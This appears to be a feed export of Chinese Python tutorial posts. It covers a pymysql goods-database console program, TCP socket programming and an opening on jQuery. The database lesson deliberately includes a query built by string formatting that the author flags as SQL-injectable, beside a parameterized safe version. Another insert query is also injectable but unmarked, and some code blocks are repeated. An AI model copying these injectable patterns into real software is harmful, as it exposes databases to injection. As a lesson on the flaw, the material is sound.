将所有笔记本的分类改为超级本&quot;)    print(&quot;6. 根据id查询商品信息&quot;)    print(&quot;7. 根据id查询商品信息安全方式&quot;)    print(&quot;8. 退出系统&quot;)</code></pre><p>三. 方法命名</p><pre><code class="python">    # 显示菜单方法    def __print_menu(self):        pass    # 打印结果方法    def __show_query_result(self, result):        pass    # 服务器运行方法,实现主体逻辑    def run(self):        pass    # 1. 查询所有商品信息    def __fetch_all_info(self):        pass   # 2. 查询所有包含商品的分类    def __fetch_cate_of_goods(self):        pass    # 3. 添加商品分类    def __add_new_cate(self):        pass      # 4. 将所有商品价格加1000    def __update_price(self):        pass    # 5. 将所有笔记本的分类改为超级本    def __update_cate(self):        pass    # 6. 根据id查询商品信息    def __fetch_info_with_id(self):        pass    # 7. 根据id查询商品信息安全方式    def __fetch_info_with_id_safe(self):        pass</code></pre><p>四. 代码实现</p><ol><li><p>判断当前是否是主程序入口</p><pre><code class="python"> if __name__ == &#39;__main__&#39;:     main()</code></pre></li><li><p>实现主函数</p><pre><code class="python"> def main():     # 创建服务器对象,并传入相应参数     jd = JDServer(&#39;jd&#39;, &#39;root&#39;, &#39;123123&#39;)     # 启动服务器     jd.run()</code></pre></li><li><p>实现 JD 类</p><pre><code class="python"> import pymysql class JDServer(object): &quot;&quot;&quot;JD 类，提供商品查询服务&quot;&quot;&quot; # 将数据库连接操作放到初化方法中，对象创建时，自动连接数据库 def __init__(self, target_db, username, password):     # 连接数据库     self.db_connect = pymysql.Connect(host=&#39;localhost&#39;,port=3306,database=target_db, user=username, passwd=password, charset=&#39;utf8&#39;) # 将数据库关闭操作放到 __del__方法中，当对象销毁时，自动关闭数据库 def __del__(self):     # 关闭数据库     self.db_connect.close()</code></pre></li><li><p>实现 run 方法 因为需要重复选择，所以要用死循环</p><pre><code class="python"> # 服务器运行方法,实现主体逻辑,通过判断输入选择相应的功能函数 def run(self):     while True:         self.__print_menu()         select_id = input(&#39;请输入功能ID:&#39;)         if select_id == &#39;1&#39;:             self.__fetch_all_info()         elif select_id == &#39;2&#39;:             self.__fetch_cate_of_goods()         elif select_id == &#39;3&#39;:             self.__add_new_cate()         elif select_id == &#39;4&#39;:             self.__update_price()         elif select_id == &#39;5&#39;:             self.__update_cate()         elif select_id == &#39;6&#39;:             self.__fetch_info_with_id()         elif select_id == &#39;7&#39;:             self.__fetch_info_with_id_safe()         elif select_id == &#39;8&#39;:             break         else:             print(&#39;输入功能不正确,请重新输入&#39;)</code></pre></li><li><p>实现一个显示方法，用来输出结果</p><pre><code class="python"> # 用来显示结果的方法，私有，对外不可见 def __show_query_result(self, result):     for item in result:         print(item)</code></pre></li><li><p>实现查询所有商品信息</p><pre><code class="python"> # 1. 查询所有商品信息 def __fetch_all_info(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39;select * from goods&#39;&#39;&#39;     cur.execute(sql_str)     result = cur.fetchall()     self.__show_query_result(result)     cur.close()</code></pre></li><li><p>查询所有包含商品的分类</p><pre><code class="python"> # 2. 查询所有包含商品的分类 def __fetch_cate_of_goods(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39;select distinct good_cates.name from goods inner join good_cates on goods.cate_id = good_cates.id;&#39;&#39;&#39;     # sql_str = &#39;&#39;&#39; select name from good_cates where id in (select distinct cate_id from goods); &#39;&#39;&#39;     cur.execute(sql_str)     result = cur.fetchall()     self.__show_query_result(result)     cur.close()</code></pre></li><li><p>添加商品分类</p><pre><code class="python"> # 3. 添加商品分类 def __add_new_cate(self):     new_cate = input(&#39;请输入一个新商品分类:&#39;)     sql_str = &#39;&#39;&#39; insert into good_cates(name) values(&quot;%s&quot;) &#39;&#39;&#39; % new_cate     cur = self.db_connect.cursor()     cur.execute(sql_str)     self.db_connect.commit()     cur.close()</code></pre></li><li><p>将所有商品价格加1000</p><pre><code class="python"> # 4. 将所有商品价格加1000 def __update_price(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39; update goods set price = price + 1000&#39;&#39;&#39;     cur.execute(sql_str)     self.db_connect.commit()     cur.close()</code></pre></li><li><p>将所有笔记本的分类改为超级本</p><pre><code class="python"># 5. 将所有笔记本的分类改为超级本def __update_cate(self):    cur = self.db_connect.cursor()    sql_str = &#39;&#39;&#39;update goods set cate_id = (select id from good_cates where name = &#39;超级本&#39;) where name like &#39;%笔记本%&#39;;&#39;&#39;&#39;    cur.execute(sql_str)    self.db_connect.commit()    cur.close()</code></pre></li><li><p>根据id 查找商品,会产生SQL注入问题</p><pre><code class="python"># 6. 根据id查询商品信息def __fetch_info_with_id(self):    s_id = input(&#39;请输入一个商品ID:&#39;)    sql_str = &#39;&#39;&#39; select * from goods where id = %s &#39;&#39;&#39; % s_id    print(sql_str)    cur = self.db_connect.cursor()    cur.execute(sql_str)    result = cur.fetchall()    self.__show_query_result(result)    cur.close()</code></pre></li><li><p>根据id查询商品信息安全方式,案例防注入</p><pre><code class="python"># 7. 根据id查询商品信息安全方式def __fetch_info_with_id_safe(self):    s_id = input(&#39;请输入一个商品ID:&#39;)    sql_str = &#39;&#39;&#39; select * from goods where id = %s &#39;&#39;&#39;    print(sql_str)    cur = self.db_connect.cursor()    cur.execute(sql_str, (s_id,))    result = cur.fetchall()    self.__show_query_result(result)    cur.close() self.__show_query_result(result)    cur.close()</code></pre></li><li><p>查询所有包含商品的分类</p><pre><code class="python"> # 2. 查询所有包含商品的分类 def __fetch_cate_of_goods(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39;select distinct good_cates.name from goods inner join good_cates on goods.cate_id = good_cates.id;&#39;&#39;&#39;     # sql_str = &#39;&#39;&#39; select name from good_cates where id in (select distinct cate_id from goods); &#39;&#39;&#39;     cur.execute(sql_str)     result = cur.fetchall()     self.__show_query_result(result)     cur.close()</code></pre></li><li><p>添加商品分类</p><pre><code class="python"> # 3. 添加商品分类 def __add_new_cate(self):     new_cate = input(&#39;请输入一个新商品分类:&#39;)     sql_str = &#39;&#39;&#39; insert into good_cates(name) values(&quot;%s&quot;) &#39;&#39;&#39; % new_cate     cur = self.db_connect.cursor()     cur.execute(sql_str)     self.db_connect.commit()     cur.close()</code></pre></li><li><p>将所有商品价格加1000</p><pre><code class="python"> # 4. 将所有商品价格加1000 def __update_price(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39; update goods set price = price + 1000&#39;&#39;&#39;     cur.execute(sql_str)     self.db_connect.commit()     cur.close()</code></pre></li><li><p>将所有笔记本的分类改为超级本</p><pre><code class="python"># 5. 将所有笔记本的分类改为超级本def __update_cate(self):    cur = self.db_connect.cursor()    sql_str = &#39;&#39;&#39;update goods set cate_id = (select id from good_cates where name = &#39;超级本&#39;) where name like &#39;%笔记本%&#39;;&#39;&#39;&#39;    cur.execute(sql_str)    self.db_connect.commit()    cur.close()</code></pre></li><li><p>根据id 查找商品,会产生SQL注入问题</p><pre><code class="python"># 6. 根据id查询商品信息def __fetch_info_with_id(self):    s_id = input(&#39;请输入一个商品ID:&#39;)    sql_str = &#39;&#39;&#39; select * from goods where id = %s &#39;&#39;&#39; % s_id    print(sql_str)    cur = self.db_connect.cursor()    cur.execute(sql_str)    result = cur.fetchall()    self.__show_query_result(result)    cur.close()</code></pre></li><li><p>根据id查询商品信息安全方式,案例防注入</p><pre><code class="python"># 7. 根据id查询商品信息安全方式def __fetch_info_with_id_safe(self):    s_id = input(&#39;请输入一个商品ID:&#39;)    sql_str = &#39;&#39;&#39; select * from goods where id = %s &#39;&#39;&#39;    print(sql_str)    cur = self.db_connect.cursor()    cur.execute(sql_str, (s_id,))    result = cur.fetchall()    self.__show_query_result(result)    cur.close()</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级03-网络编程</title>
      <link href="/2020/08/21/2020-08-10-python%E9%AB%98%E7%BA%A703-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/08/21/2020-08-10-python%E9%AB%98%E7%BA%A703-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="一-IP地址的介绍"><a href="#一-IP地址的介绍" class="headerlink" title="一. IP地址的介绍"></a>一. IP地址的介绍</h2><h3 id="1-IP-地址的概念"><a href="#1-IP-地址的概念" class="headerlink" title="1. IP 地址的概念"></a>1. IP 地址的概念</h3><a id="more"></a><p>IP地址（Internet Protocol Address）是指互联网协议地址，又译为网际协议地址。</p><p>IP地址是<a href="https://baike.baidu.com/item/IP协议" target="_blank" rel="noopener">IP协议</a>提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。</p><p>IP 地址就是<strong>标识网络中设备的一个地址</strong>，好比现实生活中的家庭地址。</p><p><strong>说明:</strong></p><ul><li>IP 地址分为两类： <strong>IPv4</strong> 和 <strong>IPv6</strong></li><li>IPv4 是目前使用的ip地址</li><li>IPv6 是未来使用的ip地址</li><li>IPv4 是由点分十进制组成</li><li>IPv6 是由冒号十六进制组成</li></ul><h3 id="2-IP-地址的作用"><a href="#2-IP-地址的作用" class="headerlink" title="2. IP 地址的作用"></a>2. IP 地址的作用</h3><p>IP 地址的作用是<strong>标识网络中唯一的一台设备的</strong>，也就是说通过IP地址能够找到网络中某台设备。</p><h3 id="3-查看-IP-地址"><a href="#3-查看-IP-地址" class="headerlink" title="3. 查看 IP 地址"></a>3. 查看 IP 地址</h3><ul><li>Linux 和 mac OS 使用 <strong>ifconfig</strong> 这个命令</li><li>Windows 使用 <strong>ipconfig</strong> 这个命令</li></ul><p>说明:</p><ul><li>127.0.0.1表示本机地址，提示：如果和自己的电脑通信就可以使用该地址。</li><li>127.0.0.1该地址对应的域名是<strong>localhost</strong>，<strong>域名是 ip 地址的别名</strong>，通过域名能解析出一个对应的ip地址。</li></ul><h3 id="4-检查网络是否正常"><a href="#4-检查网络是否正常" class="headerlink" title="4. 检查网络是否正常"></a>4. 检查网络是否正常</h3><ul><li>检查网络是否正常使用 ping 命令</li></ul><p><strong>说明:</strong></p><ul><li>ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 检查是否能上公网</li><li>ping 当前局域网的ip地址 检查是否在同一个局域网内</li><li>ping 127.0.0.1 检查本地网卡是否正常</li></ul><h2 id="二-端口和端口号的介绍"><a href="#二-端口和端口号的介绍" class="headerlink" title="二. 端口和端口号的介绍"></a>二. 端口和端口号的介绍</h2><h3 id="1-什么是端口"><a href="#1-什么是端口" class="headerlink" title="1. 什么是端口"></a>1. 什么是端口</h3><p><strong>每运行一个网络程序都会有一个端口，想要给对应的程序发送数据，找到对应的端口即可。</strong></p><p><strong>端口是传输数据的通道</strong>，好比教室的门，<strong>是数据传输必经之路</strong>。</p><p>那么如何准确的找到对应的端口呢?</p><p><strong>其实，每一个端口都会有一个对应的端口号，好比每个教室的门都有一个门牌号，想要找到端口通过端口号即可。</strong></p><h3 id="2-什么是端口号"><a href="#2-什么是端口号" class="headerlink" title="2. 什么是端口号"></a>2. 什么是端口号</h3><p>操作系统为了统一管理这么多端口，<strong>就对端口进行了编号</strong>，这就是端口号，<strong>端口号其实就是一个数字</strong>，好比我们现实生活中的门牌号，端口号可以标识唯一的一个端口。</p><p>端口号有65536个。</p><p><strong>知名端口号:</strong></p><p>知名端口号是指<strong>众所周知的端口号，范围从0到1023。</strong></p><ul><li>这些端口号一般固定分配给一些服务，比如21端口分配给FTP(文件传输协议)服务，25端口分配给SMTP（简单邮件传输协议）服务，80端口分配给HTTP服务。</li></ul><p><strong>动态端口号:</strong></p><p>一般程序员<strong>开发应用程序使用端口号称为动态端口号, 范围是从1024到65535。</strong></p><ul><li>如果程序员开发的程序没有设置端口号，操作系统会在动态端口号这个范围内随机生成一个给开发的应用程序使用。</li><li>当运行一个程序默认会有一个端口号，当这个程序退出时，所占用的这个端口号就会被释放。</li></ul><h2 id="三-TCP的介绍"><a href="#三-TCP的介绍" class="headerlink" title="三. TCP的介绍"></a>三. TCP的介绍</h2><h3 id="1-TCP-的概念"><a href="#1-TCP-的概念" class="headerlink" title="1. TCP 的概念"></a>1. TCP 的概念</h3><p>TCP 的英文全拼(Transmission Control Protocol)简称<strong>传输控制协议</strong>，它是一种<strong>面向连接的、可靠的、基于字节流的传输层通信协议</strong>。</p><p><strong>TCP 通信步骤:</strong></p><ol><li>创建连接</li><li>传输数据</li><li>关闭连接</li></ol><p><strong>说明:</strong></p><p>TCP 通信模型相当于生活中的’打电话‘，在通信开始之前，一定要先建立好连接，才能发送数据，通信结束要关闭连接。</p><h3 id="2-TCP-的特点"><a href="#2-TCP-的特点" class="headerlink" title="2. TCP 的特点"></a>2. TCP 的特点</h3><ol><li>面向连接<ul><li>通信双方必须先建立好连接才能进行数据的传输，数据传输完成后，双方必须断开此连接，以释放系统资源。</li></ul></li><li>可靠传输<ul><li>TCP 采用发送应答机制</li><li>超时重传</li><li>错误校验</li><li>流量控制和阻塞管理</li></ul></li></ol><h2 id="四-socket的介绍"><a href="#四-socket的介绍" class="headerlink" title="四. socket的介绍"></a>四. socket的介绍</h2><h3 id="1-socket-的概念"><a href="#1-socket-的概念" class="headerlink" title="1. socket 的概念"></a>1. socket 的概念</h3><p>socket (简称 套接字) 是<strong>进程之间通信一个工具</strong>，好比现实生活中的<strong>插座</strong>，所有的家用电器要想工作都是基于插座进行，<strong>进程之间想要进行网络通信需要基于这个 socket</strong>。</p><h3 id="2-socket-的作用"><a href="#2-socket-的作用" class="headerlink" title="2. socket 的作用"></a>2. socket 的作用</h3><p>负责<strong>进程之间的网络数据传输</strong>，好比数据的搬运工。</p><h3 id="3-socket-使用场景"><a href="#3-socket-使用场景" class="headerlink" title="3. socket 使用场景"></a>3. socket 使用场景</h3><p>不夸张的说，只要跟<strong>网络相关的应用程序或者软件都使用到了 socket</strong> 。</p><h2 id="五-TCP网络应用程序开发流程"><a href="#五-TCP网络应用程序开发流程" class="headerlink" title="五. TCP网络应用程序开发流程"></a>五. TCP网络应用程序开发流程</h2><h3 id="1-TCP-网络应用程序开发流程的介绍"><a href="#1-TCP-网络应用程序开发流程的介绍" class="headerlink" title="1. TCP 网络应用程序开发流程的介绍"></a>1. TCP 网络应用程序开发流程的介绍</h3><p>TCP 网络应用程序开发分为:</p><ul><li>TCP 客户端程序开发</li><li>TCP 服务端程序开发</li></ul><p><strong>说明:</strong></p><p>客户端程序是指运行在<strong>用户设备上的程序</strong> 服务端程序是指运行在<strong>服务器设备上的程序</strong>，专门为客户端提供数据服务。</p><ol><li><strong>主动发起建立连接请求的</strong>是客户端程序</li><li><strong>等待接受连接请求的</strong>是服务端程序</li></ol><h3 id="2-TCP-客户端程序开发流程的介绍"><a href="#2-TCP-客户端程序开发流程的介绍" class="headerlink" title="2. TCP 客户端程序开发流程的介绍"></a>2. TCP 客户端程序开发流程的介绍</h3><ol><li>创建客户端套接字对象</li><li>和服务端套接字建立连接</li><li>发送数据</li><li>接收数据</li><li>关闭客户端套接字</li></ol><h3 id="3-TCP-服务端程序开发流程的介绍"><a href="#3-TCP-服务端程序开发流程的介绍" class="headerlink" title="3. TCP 服务端程序开发流程的介绍"></a>3. TCP 服务端程序开发流程的介绍</h3><ol><li>创建服务端端套接字对象</li><li>绑定端口号</li><li>设置监听</li><li>等待接受客户端的连接请求</li><li>接收数据</li><li>发送数据</li><li>关闭套接字</li></ol><h2 id="六-TCP客户端程序开发"><a href="#六-TCP客户端程序开发" class="headerlink" title="六. TCP客户端程序开发"></a>六. TCP客户端程序开发</h2><h3 id="1-开发-TCP-客户端程序开发步骤回顾"><a href="#1-开发-TCP-客户端程序开发步骤回顾" class="headerlink" title="1. 开发 TCP 客户端程序开发步骤回顾"></a>1. 开发 TCP 客户端程序开发步骤回顾</h3><ol><li>创建客户端套接字对象</li><li>和服务端套接字建立连接</li><li>发送数据</li><li>接收数据</li><li>关闭客户端套接字</li></ol><h3 id="2-socket-类的介绍"><a href="#2-socket-类的介绍" class="headerlink" title="2. socket 类的介绍"></a>2. socket 类的介绍</h3><p>导入 socket 模块<br><strong>import socket</strong></p><p>创建客户端 socket 对象<br><strong>socket.socket(AddressFamily, Type)</strong></p><p><strong>参数说明:</strong></p><ul><li>AddressFamily 表示IP地址类型, 分为IPv4和IPv6</li><li>Type 表示传输协议类型</li></ul><p><strong>方法说明:</strong></p><ul><li>connect((host, port)) 表示和服务端套接字建立连接, host是服务器ip地址，port是应用程序的端口号</li><li>send(data) 表示发送数据，data是二进制数据</li><li>recv(buffersize) 表示接收数据, buffersize是每次接收数据的长度</li></ul><h3 id="3-TCP-客户端程序开发示例代码"><a href="#3-TCP-客户端程序开发示例代码" class="headerlink" title="3. TCP 客户端程序开发示例代码"></a>3. TCP 客户端程序开发示例代码</h3><pre><code class="python">import socketif __name__ == &#39;__main__&#39;:    # 创建tcp客户端套接字    # 1. AF_INET：表示ipv4    # 2. SOCK_STREAM: tcp传输协议    tcp_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # 和服务端应用程序建立连接    tcp_client_socket.connect((&quot;192.168.131.62&quot;, 8080))    # 代码执行到此，说明连接建立成功    # 准备发送的数据    send_data = &quot;你好服务端，我是客户端!&quot;.encode(&quot;utf-8&quot;)    # 发送数据    tcp_client_socket.send(send_data)    # 接收数据, 这次接收的数据最大字节数是1024    recv_data = tcp_client_socket.recv(1024)    # 返回的直接是服务端程序发送的二进制数据    print(recv_data)    # 对数据进行解码    recv_content = recv_data.decode(&quot;utf-8&quot;)    print(&quot;接收服务端的数据为:&quot;, recv_content)    # 关闭套接字    tcp_client_socket.close()</code></pre><p><strong>执行结果:</strong></p><pre><code class="py">b&#39;hello&#39;接收服务端的数据为: hello</code></pre><p><strong>说明</strong></p><ol><li>str.encode(编码格式) 表示把字符串编码成为二进制</li><li>data.decode(编码格式) 表示把二进制解码成为字符串</li></ol><h2 id="七-TCP服务端程序开发"><a href="#七-TCP服务端程序开发" class="headerlink" title="七. TCP服务端程序开发"></a>七. TCP服务端程序开发</h2><h3 id="1-开发-TCP-服务端程序开发步骤回顾"><a href="#1-开发-TCP-服务端程序开发步骤回顾" class="headerlink" title="1. 开发 TCP 服务端程序开发步骤回顾"></a>1. 开发 TCP 服务端程序开发步骤回顾</h3><ol><li>创建服务端端套接字对象</li><li>绑定端口号</li><li>设置监听</li><li>等待接受客户端的连接请求</li><li>接收数据</li><li>发送数据</li><li>关闭套接字</li></ol><h3 id="2-socket-类的介绍-1"><a href="#2-socket-类的介绍-1" class="headerlink" title="2. socket 类的介绍"></a>2. socket 类的介绍</h3><p>导入 socket 模块<br><strong>import socket</strong></p><p>创建服务端 socket 对象<br><strong>socket.socket(AddressFamily, Type)</strong></p><p><strong>参数说明:</strong></p><ul><li>AddressFamily 表示IP地址类型, 分为IPv4和IPv6</li><li>Type 表示传输协议类型</li></ul><p><strong>方法说明:</strong></p><ul><li>bind((host, port)) 表示绑定端口号, host 是 ip 地址，port 是端口号，ip 地址一般不指定，表示本机的任何一个ip地址都可以。</li><li>listen (backlog) 表示设置监听，backlog参数表示最大等待建立连接的个数。</li><li>accept() 表示等待接受客户端的连接请求</li><li>send(data) 表示发送数据，data 是二进制数据</li><li>recv(buffersize) 表示接收数据, buffersize 是每次接收数据的长度</li></ul><h3 id="3-TCP-服务端程序开发示例代码"><a href="#3-TCP-服务端程序开发示例代码" class="headerlink" title="3. TCP 服务端程序开发示例代码"></a>3. TCP 服务端程序开发示例代码</h3><pre><code class="python">import socketif __name__ == &#39;__main__&#39;:    # 创建tcp服务端套接字    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # 设置端口号复用，让程序退出端口号立即释放    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)     # 给程序绑定端口号    tcp_server_socket.bind((&quot;&quot;, 8080))    # 设置监听    # 128:最大等待建立连接的个数， 提示： 目前是单任务的服务端，同一时刻只能服务与一个客户端，后续使用多任务能够让服务端同时服务与多个客户端，    # 不需要让客户端进行等待建立连接    # listen后的这个套接字只负责接收客户端连接请求，不能收发消息，收发消息使用返回的这个新套接字来完成    tcp_server_socket.listen(128)    # 等待客户端建立连接的请求, 只有客户端和服务端建立连接成功代码才会解阻塞，代码才能继续往下执行    # 1. 专门和客户端通信的套接字： service_client_socket    # 2. 客户端的ip地址和端口号： ip_port    service_client_socket, ip_port = tcp_server_socket.accept()    # 代码执行到此说明连接建立成功    print(&quot;客户端的ip地址和端口号:&quot;, ip_port)    # 接收客户端发送的数据, 这次接收数据的最大字节数是1024    recv_data = service_client_socket.recv(1024)    # 获取数据的长度    recv_data_length = len(recv_data)    print(&quot;接收数据的长度为:&quot;, recv_data_length)    # 对二进制数据进行解码    recv_content = recv_data.decode(&quot;utf-8&quot;)    print(&quot;接收客户端的数据为:&quot;, recv_content)    # 准备发送的数据    send_data = &quot;ok, 问题正在处理中...&quot;.encode(&quot;utf-8&quot;)    # 发送数据给客户端    service_client_socket.send(send_data)    # 关闭服务与客户端的套接字， 终止和客户端通信的服务    service_client_socket.close()    # 关闭服务端的套接字, 终止和客户端提供建立连接请求的服务    tcp_server_socket.close()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">客户端的ip地址和端口号: (&#39;172.16.47.209&#39;, 52472)接收数据的长度为: 5接收客户端的数据为: hello</code></pre><p><strong>说明:</strong></p><p>当客户端和服务端建立连接后，<strong>服务端程序退出后端口号不会立即释放，需要等待大概1-2分钟。</strong></p><p>解决办法有两种:</p><ol><li>更换服务端端口号</li><li>设置端口号复用(推荐大家使用)，也就是说让服务端程序退出后端口号立即释放。</li></ol><p>设置端口号复用的代码如下:</p><pre><code class="py"># 参数1: 表示当前套接字# 参数2: 设置端口号复用选项# 参数3: 设置端口号复用选项对应的值tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)</code></pre><h2 id="八-TCP网络应用程序的注意点"><a href="#八-TCP网络应用程序的注意点" class="headerlink" title="八. TCP网络应用程序的注意点"></a>八. TCP网络应用程序的注意点</h2><h3 id="1-TCP网络应用程序的注意点介绍"><a href="#1-TCP网络应用程序的注意点介绍" class="headerlink" title="1. TCP网络应用程序的注意点介绍"></a>1. TCP网络应用程序的注意点介绍</h3><ol><li>当 TCP 客户端程序想要和 TCP 服务端程序进行通信的时候必须要先<strong>建立连接</strong></li><li>TCP 客户端程序一般不需要绑定端口号，因为客户端是主动发起建立连接的。</li><li><strong>TCP 服务端程序必须绑定端口号</strong>，否则客户端找不到这个 TCP 服务端程序。</li><li>listen 后的套接字是被动套接字，<strong>只负责接收新的客户端的连接请求，不能收发消息。</strong></li><li>当 TCP 客户端程序和 TCP 服务端程序连接成功后， TCP 服务器端程序会产生一个<strong>新的套接字</strong>，收发客户端消息使用该套接字。</li><li><strong>关闭 accept 返回的套接字意味着和这个客户端已经通信完毕</strong>。</li><li><strong>关闭 listen 后的套接字意味着服务端的套接字关闭了，会导致新的客户端不能连接服务端，但是之前已经接成功的客户端还能正常通信。</strong></li><li><strong>当客户端的套接字调用 close 后，服务器端的 recv 会解阻塞，返回的数据长度为0</strong>，服务端可以通过返回数据的长度来判断客户端是否已经下线，反之<strong>服务端关闭套接字，客户端的 recv 也会解阻塞，返回的数据长度也为0</strong>。</li></ol><h2 id="九-案例-多任务版TCP服务程序"><a href="#九-案例-多任务版TCP服务程序" class="headerlink" title="九. 案例-多任务版TCP服务程序"></a>九. 案例-多任务版TCP服务程序</h2><h3 id="1-需求"><a href="#1-需求" class="headerlink" title="1. 需求"></a>1. 需求</h3><p>目前我们开发的TCP服务端程序只能服务于一个客户端，如何开发一个多任务版的TCP服务端程序能够服务于多个客户端呢?</p><p>完成多任务，可以使用<strong>线程</strong>，比进程更加节省内存资源。</p><h3 id="2-具体实现步骤"><a href="#2-具体实现步骤" class="headerlink" title="2. 具体实现步骤"></a>2. 具体实现步骤</h3><ol><li>编写一个TCP服务端程序，循环等待接受客户端的连接请求</li><li>当客户端和服务端建立连接成功，创建子线程，使用子线程专门处理客户端的请求，防止主线程阻塞</li><li>把创建的子线程设置成为守护主线程，防止主线程无法退出。</li></ol><h3 id="3-多任务版TCP服务端程序的示例代码"><a href="#3-多任务版TCP服务端程序的示例代码" class="headerlink" title="3. 多任务版TCP服务端程序的示例代码:"></a>3. 多任务版TCP服务端程序的示例代码:</h3><pre><code class="python">import socketimport threading# 处理客户端的请求操作def handle_client_request(service_client_socket, ip_port):    # 循环接收客户端发送的数据    while True:        # 接收客户端发送的数据        recv_data = service_client_socket.recv(1024)        # 容器类型判断是否有数据可以直接使用if语句进行判断，如果容器类型里面有数据表示条件成立，否则条件失败        # 容器类型: 列表、字典、元组、字符串、set、range、二进制数据        if recv_data:            print(recv_data.decode(&quot;utf-8&quot;), ip_port)            # 回复            service_client_socket.send(&quot;ok，问题正在处理中...&quot;.encode(&quot;utf-8&quot;))        else:            print(&quot;客户端下线了:&quot;, ip_port)            break    # 终止和客户端进行通信    service_client_socket.close()if __name__ == &#39;__main__&#39;:    # 创建tcp服务端套接字    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # 设置端口号复用，让程序退出端口号立即释放    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)    # 绑定端口号    tcp_server_socket.bind((&quot;&quot;, 8080))    # 设置监听, listen后的套接字是被动套接字，只负责接收客户端的连接请求    tcp_server_socket.listen(128)    # 循环等待接收客户端的连接请求    while True:        # 等待接收客户端的连接请求        service_client_socket, ip_port = tcp_server_socket.accept()        print(&quot;客户端连接成功:&quot;, ip_port)        # 当客户端和服务端建立连接成功以后，需要创建一个子线程，不同子线程负责接收不同客户端的消息        sub_thread = threading.Thread(target=handle_client_request, args=(service_client_socket, ip_port))        # 设置守护主线程        sub_thread.setDaemon(True)        # 启动子线程        sub_thread.start()    # tcp服务端套接字可以不需要关闭，因为服务端程序需要一直运行    # tcp_server_socket.close()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">客户端连接成功: (&#39;172.16.47.209&#39;, 51528)客户端连接成功: (&#39;172.16.47.209&#39;, 51714)hello1 (&#39;172.16.47.209&#39;, 51528)hello2 (&#39;172.16.47.209&#39;, 51714)</code></pre><h2 id="十-socket的send和recv原理剖析"><a href="#十-socket的send和recv原理剖析" class="headerlink" title="十. socket的send和recv原理剖析"></a>十. socket的send和recv原理剖析</h2><h3 id="1-认识TCP-socket的发送和接收缓冲区"><a href="#1-认识TCP-socket的发送和接收缓冲区" class="headerlink" title="1. 认识TCP socket的发送和接收缓冲区"></a>1. 认识TCP socket的发送和接收缓冲区</h3><p>当创建一个TCP socket对象的时候会有一个<strong>发送缓冲区</strong>和一个<strong>接收缓冲区</strong>，<strong>这个发送和接收缓冲区指的就是内存中的一片空间。</strong></p><h3 id="2-send原理剖析"><a href="#2-send原理剖析" class="headerlink" title="2. send原理剖析"></a>2. send原理剖析</h3><p>send是不是直接把数据发给服务端?</p><p>不是，要想发数据，必须得<strong>通过网卡发送数据</strong>，应用程序是无法直接通过网卡发送数据的，它需要调用操作系统接口，也就是说，应用程序把发送的数据先写入到<strong>发送缓冲区</strong>(内存中的一片空间)，再<strong>由操作系统控制网卡把发送缓冲区的数据发送给服务端网卡</strong> 。</p><h3 id="3-recv原理剖析"><a href="#3-recv原理剖析" class="headerlink" title="3. recv原理剖析"></a>3. recv原理剖析</h3><p>recv是不是直接从客户端接收数据?</p><p>不是，<strong>应用软件是无法直接通过网卡接收数据的</strong>，它需要调用操作系统接口，<strong>由操作系统通过网卡接收数据</strong>，把接收的数据<strong>写入到接收缓冲区</strong>(内存中的一片空间），应用程序<strong>再从接收缓存区获取客户端发送的数据</strong>。</p><p><strong>说明:</strong></p><ul><li>发送数据是发送到发送缓冲区</li><li>接收数据是从接收缓冲区 获取</li></ul><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h3><p>不管是recv还是send都不是直接接收到对方的数据和发送数据到对方，<strong>发送数据会写入到发送缓冲区，接收数据是从接收缓冲区来读取，发送数据和接收数据最终是由操作系统控制网卡来完成。</strong></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级07-jQuery</title>
      <link href="/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A707-jQuery/"/>
      <url>/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A707-jQuery/</url>
      
        <content type="html"><![CDATA[<h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><h2 id="一、jQuery的介绍"><a href="#一、jQuery的介绍" class="headerlink" title="一、jQuery的介绍"></a>一、jQuery的介绍</h2><h3 id="1-jQuery的定义"><a href="#1-jQuery的定义" class="headerlink" title="1. jQuery的定义"></a>1. jQuery的定义</h3><a id="more"></a><p>jQuery是对JavaScript的封装，它是免费、开源的JavaScript函数库，jQuery 极大地简化了 JavaScript 编程。</p><p>jQuery官网：<a href="https://jquery.com/" target="_blank" rel="noopener">https://jquery.com/</a></p><h3 id="2-jQuery的作用"><a href="#2-jQuery的作用" class="headerlink" title="2. jQuery的作用"></a>2. jQuery的作用</h3><p>jQuery和JavaScript它们的作用一样，都是负责网页行为操作，增加网页和用户的交互效果的，只不过jQuery简化了JavaScript编程，jQuery实现交互效果更简单。</p><h3 id="3-jQuery的优点"><a href="#3-jQuery的优点" class="headerlink" title="3. jQuery的优点"></a>3. 